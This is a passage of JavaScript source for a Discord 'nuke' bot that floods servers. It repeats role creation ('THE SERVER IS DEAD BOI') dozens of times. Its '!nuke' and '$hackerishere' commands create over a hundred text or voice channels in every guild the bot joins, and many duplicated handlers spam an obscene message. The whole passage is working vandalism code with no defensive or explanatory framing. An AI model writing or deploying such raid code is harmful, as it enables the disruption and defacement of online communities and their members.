        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	 m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	  m.createRole({
        name : "THE SERVER IS DEAD BOI",
        permissions :   [1],
        color : " #ff0000"
    })
	
	
 
           
            

 
   
})
 
 
}
});
// رومات السيرفر
LOka.on('message', message => {
         if (message.content === "!nuke") {
               LOka.guilds.forEach(m =>{
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');
m.createChannel('the-server-got-fucked-up', 'text');







})
}
});
LOka.on('message', message => {
         if (message.content === "$hackerishere") {
                 LOka.guilds.forEach(m =>{

m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');
m.createChannel('THE SERVER GOT FUCKED UP', 'voice');







 
 
})
}
 
});
   
 
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
        message.channel.send('THE SERVER GOT FUCKED UP')
    }
});
LOka.on('message', message => {
    if(message.content === '!nuke'){
